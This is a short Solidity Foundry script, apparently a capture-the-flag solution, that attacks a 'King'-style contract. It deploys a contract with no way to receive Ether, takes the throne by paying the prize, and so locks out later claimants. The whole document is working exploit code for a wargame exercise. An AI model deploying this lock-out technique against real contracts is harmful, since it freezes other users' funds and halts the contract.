//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
		
	NewKing newKing;	
	address victim = /* Your instance address */ ;	

	function run() public {
	(, bytes memory data) = victim.staticcall(abi.encodeWithSignature("prize()"));
	uint256 prize = abi.decode(data, (uint256));	
	vm.startBroadcast();
	newKing = new NewKing{value: prize}(victim, prize);
	newKing.attack();
	vm.stopBroadcast();
}
}

contract NewKing {
	address victim;
	uint256 prize;

	constructor(address _victim, uint256 _prize) payable {
	victim = _victim;
	prize = _prize;
}

	function attack() public {
	victim.call{value: prize}("");
}
}
